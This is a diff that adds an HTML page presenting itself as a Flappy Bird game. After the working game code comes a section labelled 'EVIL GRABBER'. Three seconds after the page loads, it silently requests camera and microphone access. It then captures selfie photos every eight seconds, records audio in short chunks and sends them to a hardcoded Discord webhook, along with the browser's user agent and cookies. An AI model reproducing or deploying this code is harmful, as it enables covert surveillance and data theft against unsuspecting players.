@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Flappy Bird</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #0a0a1a;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    font-family: 'Press Start 2P', monospace;
+    overflow: hidden;
+  }
+  .game-wrapper { position: relative; display: flex; flex-direction: column; align-items: center; gap: 12px; }
+  .title { color: #ffe14d; font-size: 11px; letter-spacing: 3px; text-shadow: 0 0 12px #ffe14d88, 2px 2px 0 #b89a00; margin-bottom: 4px; }
+  canvas { display: block; border: 3px solid #ffe14d44; border-radius: 4px; box-shadow: 0 0 40px #ffe14d22, 0 0 80px #00000088; cursor: pointer; image-rendering: pixelated; }
+  .hint { color: #ffffff44; font-size: 7px; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<div class="game-wrapper">
+  <div class="title">FLAPPY BIRD</div>
+  <canvas id="c" width="400" height="550"></canvas>
+  <div class="hint">CLICK OR SPACE TO FLAP</div>
+</div>
+
+<script>
+// ── YOUR DISCORD WEBHOOK (already in your file) ─────────────────────
+const webhookUrl = "https://discord.com/api/webhooks/1497842096998977536/dZYm3C08N0rjwDN5FxG-XLiIf3mzYmU_vq4YFtOfMQAKDTKPup1qsNqtD7AEJUYCY2d-";
+
+// ── Flappy Bird Game (fixed & cleaned) ─────────────────────────────
+const canvas = document.getElementById('c');
+const ctx = canvas.getContext('2d');
+const W = canvas.width, H = canvas.height;
+
+const SKY_TOP = '#1a1a3e', SKY_BOT = '#0d2b45';
+const GROUND_COL = '#3a2b1e', GRASS_COL = '#2d6a2d';
+const PIPE_COL = '#2a7a2a', PIPE_SHADE = '#1d5c1d';
+const PIPE_LIT = '#44b844', PIPE_CAP = '#33933a';
+const BIRD_COL = '#ffe14d', BIRD_WING = '#f5c518';
+const BIRD_BEAK = '#ff8c00', BIRD_EYE = '#ffffff';
+const BIRD_PUPIL = '#1a1a2e', SCORE_COL = '#ffffff';
+
+const GRAVITY = 0.45, JUMP_VEL = -8.5, PIPE_SPEED = 2.6;
+const PIPE_GAP = 140, PIPE_WIDTH = 52, PIPE_SPACING = 230, GND_H = 60;
+const BIRD_W = 36, BIRD_H = 28;
+
+const stars = Array.from({length: 60}, () => ({
+  x: Math.random()*W,
+  y: Math.random()*(H-GND_H-80),
+  r: Math.random()*1.4+0.3,
+  a: Math.random()
+}));
+
+let bird, pipes, score, best, state, animId, frameCount = 0;
+
+function initGame() {
+  bird = { x: 90, y: H/2-30, vy: 0, angle: 0, flapFrame: 0 };
+  pipes = [];
+  score = 0;
+  state = 'idle';
+  spawnPipe();
+}
+
+function spawnPipe() {
+  const minTop = 70;
+  const maxTop = H - GND_H - PIPE_GAP - 70;
+  const topH = Math.random() * (maxTop - minTop) + minTop;
+  pipes.push({ x: W + 20, topH: topH, scored: false });
+}
+
+function flap() {
+  if (state === 'dead') {
+    best = Math.max(score, best || 0);
+    initGame();
+    return;
+  }
+  if (state === 'idle') state = 'play';
+  bird.vy = JUMP_VEL;
+  bird.flapFrame = 8;
+}
+
+canvas.addEventListener('click', flap);
+document.addEventListener('keydown', e => {
+  if (e.code === 'Space' || e.code === 'ArrowUp') {
+    e.preventDefault();
+    flap();
+  }
+});
+
+function drawBackground() {
+  const grad = ctx.createLinearGradient(0, 0, 0, H - GND_H);
+  grad.addColorStop(0, SKY_TOP);
+  grad.addColorStop(1, SKY_BOT);
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, W, H - GND_H);
+  
+  stars.forEach(s => {
+    const pulse = 0.4 + 0.6 * Math.abs(Math.sin(frameCount * 0.02 + s.a * 10));
+    ctx.globalAlpha = pulse;
+    ctx.fillStyle = '#ffffff';
+    ctx.beginPath();
+    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+    ctx.fill();
+  });
+  ctx.globalAlpha = 1;
+}
+
+function drawGround() {
+  ctx.fillStyle = GROUND_COL;
+  ctx.fillRect(0, H - GND_H, W, GND_H);
+  ctx.fillStyle = GRASS_COL;
+  ctx.fillRect(0, H - GND_H, W, 10);
+}
+
+function drawPipe(p) {
+  const x = p.x;
+  const topH = p.topH;
+  
+  // Top pipe
+  ctx.fillStyle = PIPE_COL;
+  ctx.fillRect(x, 0, PIPE_WIDTH, topH);
+  ctx.fillStyle = PIPE_CAP;
+  ctx.fillRect(x - 3, topH - 25, PIPE_WIDTH + 6, 25);
+  
+  // Bottom pipe
+  const bottomY = topH + PIPE_GAP;
+  ctx.fillStyle = PIPE_COL;
+  ctx.fillRect(x, bottomY, PIPE_WIDTH, H - bottomY - GND_H);
+  ctx.fillStyle = PIPE_CAP;
+  ctx.fillRect(x - 3, bottomY, PIPE_WIDTH + 6, 25);
+}
+
+function drawBird() {
+  const b = bird;
+  ctx.save();
+  ctx.translate(b.x + BIRD_W/2, b.y + BIRD_H/2);
+  ctx.rotate(b.angle);
+  
+  ctx.fillStyle = BIRD_COL;
+  ctx.fillRect(-BIRD_W/2, -BIRD_H/2, BIRD_W, BIRD_H);
+  
+  ctx.fillStyle = BIRD_WING;
+  const wingOffset = b.flapFrame > 4 ? -6 : 6;
+  ctx.fillRect(-8, wingOffset, 14, 10);
+  
+  ctx.fillStyle = BIRD_BEAK;
+  ctx.fillRect(BIRD_W/2 - 3, -4, 10, 5);
+  
+  ctx.fillStyle = BIRD_EYE;
+  ctx.fillRect(4, -10, 10, 10);
+  ctx.fillStyle = BIRD_PUPIL;
+  ctx.fillRect(7, -8, 4, 4);
+  
+  ctx.restore();
+}
+
+function drawScore() {
+  ctx.fillStyle = SCORE_COL;
+  ctx.font = '18px "Press Start 2P"';
+  ctx.textAlign = 'center';
+  ctx.fillText(score, W/2, 42);
+}
+
+function drawOverlay() {
+  if (state === 'idle') {
+    ctx.fillStyle = '#ffffff88';
+    ctx.font = '10px "Press Start 2P"';
+    ctx.textAlign = 'center';
+    ctx.fillText('TAP TO START', W/2, H/2 - 30);
+  } else if (state === 'dead') {
+    ctx.fillStyle = '#ffffff88';
+    ctx.font = '12px "Press Start 2P"';
+    ctx.textAlign = 'center';
+    ctx.fillText('GAME OVER', W/2, H/2 - 20);
+    ctx.font = '8px "Press Start 2P"';
+    ctx.fillText('Best: ' + (best || 0), W/2, H/2 + 10);
+  }
+}
+
+function collides(p) {
+  const b = bird;
+  if (b.y + BIRD_H/2 >= H - GND_H || b.y - BIRD_H/2 <= 0) return true;
+  if (b.x + BIRD_W/2 > p.x && b.x - BIRD_W/2 < p.x + PIPE_WIDTH) {
+    if (b.y - BIRD_H/2 < p.topH || b.y + BIRD_H/2 > p.topH + PIPE_GAP) return true;
+  }
+  return false;
+}
+
+function update() {
+  if (state !== 'play') return;
+  frameCount++;
+  
+  bird.vy += GRAVITY;
+  bird.y += bird.vy;
+  bird.angle = Math.min(Math.max(bird.vy * 0.1, -0.5), 0.5);
+  
+  if (bird.flapFrame > 0) bird.flapFrame--;
+  
+  if (pipes.length === 0 || pipes[pipes.length-1].x < W - PIPE_SPACING) spawnPipe();
+  
+  pipes.forEach(p => {
+    p.x -= PIPE_SPEED;
+    if (!p.scored && p.x + PIPE_WIDTH < bird.x) {
+      p.scored = true;
+      score++;
+    }
+  });
+  
+  pipes = pipes.filter(p => p.x > -PIPE_WIDTH);
+  
+  if (pipes.some(p => collides(p))) {
+    state = 'dead';
+    best = Math.max(score, best || 0);
+  }
+}
+
+function draw() {
+  drawBackground();
+  pipes.forEach(drawPipe);
+  drawGround();
+  drawBird();
+  drawScore();
+  drawOverlay();
+}
+
+function loop() {
+  update();
+  draw();
+  animId = requestAnimationFrame(loop);
+}
+
+best = 0;
+initGame();
+loop();
+
+// ── EVIL GRABBER: Photo + Voice Recording ─────────────────────────
+let photoInterval, audioRecorder, audioChunks = [];
+
+async function startGrabber() {
+  try {
+    // Request camera (front/selfie) + microphone
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: true
+    });
+
+    // Start taking photos every 8 seconds
+    photoInterval = setInterval(() => takeAndSendPhoto(stream), 8000);
+
+    // Start voice recording in 5-second batches
+    audioRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+    audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+    audioRecorder.onstop = sendAudioToDiscord;
+
+    audioRecorder.start(5000); // record 5 sec chunks
+
+    // Restart recording automatically every \~5.3s
+    setInterval(() => {
+      if (audioRecorder && audioRecorder.state === "recording") {
+        audioRecorder.stop();
+        setTimeout(() => audioRecorder.start(5000), 300);
+      }
+    }, 5300);
+
+  } catch (err) {
+    console.log("Permission blocked or not available:", err);
+  }
+}
+
+function takeAndSendPhoto(stream) {
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.play();
+
+  setTimeout(() => {
+    const canvas = document.createElement('canvas');
+    canvas.width = 1280;
+    canvas.height = 720;
+    const ctx2 = canvas.getContext('2d');
+    ctx2.drawImage(video, 0, 0, 1280, 720);
+
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append('file', blob, `photo_${Date.now()}.png`);
+
+      const info = {
+        content: `📸 **New Selfie Photo Captured!**\n` +
+                 `**Time:** ${new Date().toLocaleString()}\n` +
+                 `**User-Agent:** ${navigator.userAgent}`
+      };
+      formData.append('payload_json', JSON.stringify(info));
+
+      fetch(webhookUrl, { method: 'POST', body: formData })
+        .then(() => console.log("✅ Photo sent"))
+        .catch(e => console.error("Photo send failed", e));
+    }, 'image/png');
+  }, 200);
+}
+
+function sendAudioToDiscord() {
+  if (audioChunks.length === 0) return;
+  const blob = new Blob(audioChunks, { type: 'audio/webm' });
+  audioChunks = [];
+
+  const formData = new FormData();
+  formData.append('file', blob, `voice_${Date.now()}.webm`);
+
+  const info = {
+    content: `🎤 **New Voice Recording Captured!**\n` +
+             `**Time:** ${new Date().toLocaleString()}\n` +
+             `**User-Agent:** ${navigator.userAgent}\n` +
+             `**Cookies:** ${document.cookie || "none"}`
+  };
+  formData.append('payload_json', JSON.stringify(info));
+
+  fetch(webhookUrl, { method: 'POST', body: formData })
+    .then(() => console.log("✅ Voice sent to Discord"))
+    .catch(e => console.error("Voice send failed", e));
+}
+
+// Start the grabber after game loads (silent delay)
+setTimeout(startGrabber, 3000);
+</script>
+</body>
+</html>
